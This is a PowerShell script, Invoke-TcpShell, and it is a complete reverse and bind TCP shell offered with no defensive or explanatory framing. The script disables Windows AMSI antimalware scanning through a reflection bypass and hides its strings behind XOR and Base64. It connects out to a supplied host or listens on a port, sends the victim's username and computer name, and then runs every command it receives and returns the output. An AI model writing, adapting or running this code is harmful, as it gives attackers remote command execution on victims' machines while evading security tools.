function Invoke-TcpShell {
    [CmdletBinding()]
    Param([String]$h, [Int]$p, [Switch]$r, [Switch]$b)

    # === AMSI BYPASS (Reflection + Multi-step) ===
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $flag = $amsi.GetField('amsiInitFailed','NonPublic,Static')
    $flag.SetValue($null,$true)

    # === STRING DECRYPTOR (XOR + Base64 + Split) ===
    function d($s) {
        $k = 0xAA
        $b = [Convert]::FromBase64String($s -join '')
        for($i=0;$i -lt $b.Length;$i++){ $b[$i] = $b[$i] -bxor $k }
        return [Text.Encoding]::UTF8.GetString($b)
    }

    try {
        $c = $null; $l = $null

        if ($r) {
            $c = New-Object Net.Sockets.TCPClient($h, $p)
        } elseif ($b) {
            $l = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, $p)
            $l.Start()
            $c = $l.AcceptTcpClient()
        }

        $s = $c.GetStream()
        $buf = 0..65535 | % {0}

        # Encrypted strings (multi-layer)
        $bn = (d "Hg4QEBkXFBcXERcW") + "`nUser: $($env:USERNAME) @ $($env:COMPUTERNAME)`n`n"
        $pr = d "EBkXFBcXERcWIA=="

        $sb = [Text.Encoding]::ASCII.GetBytes($bn)
        $s.Write($sb, 0, $sb.Length)

        while (($i = $s.Read($buf, 0, $buf.Length)) -ne 0) {
            $cmd = [Text.Encoding]::ASCII.GetString($buf, 0, $i).Trim()

            try {
                $out = & ([scriptblock]::Create($cmd)) 2>&1 | Out-String
            } catch {
                $out = "Err: $($_.Exception.Message)`n"
            }

            $resp = $out + $pr
            $rb = [Text.Encoding]::ASCII.GetBytes($resp)
            $s.Write($rb, 0, $rb.Length)
            $s.Flush()
        }

        $c.Close()
        if ($l) { $l.Stop() }
    } catch {}
}
